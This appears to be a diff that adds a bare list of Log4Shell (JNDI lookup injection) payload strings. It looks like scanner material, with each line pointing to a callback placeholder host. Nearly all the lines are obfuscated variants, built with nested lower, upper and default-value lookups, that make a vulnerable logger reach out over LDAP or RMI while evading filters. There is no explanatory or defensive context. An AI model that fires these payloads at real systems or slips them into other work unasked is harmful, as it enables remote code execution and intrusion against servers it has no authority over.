@@ -1,0 +1,12 @@
+```
+${jndi:ldap://{{interactsh-url}}/poc}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}poc}
+${${::-j}ndi:rmi://{{interactsh-url}}/poc}
+${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}
+${${aaa:bbb:-j}ndi:rmi://{{interactsh-url}}/poc}
+${${:::::::::-j}ndi:rmi://{{interactsh-url}}/poc}
+${${:p:q::zz::::::::-j}ndi:rmi://{{interactsh-url}}/poc}
+```
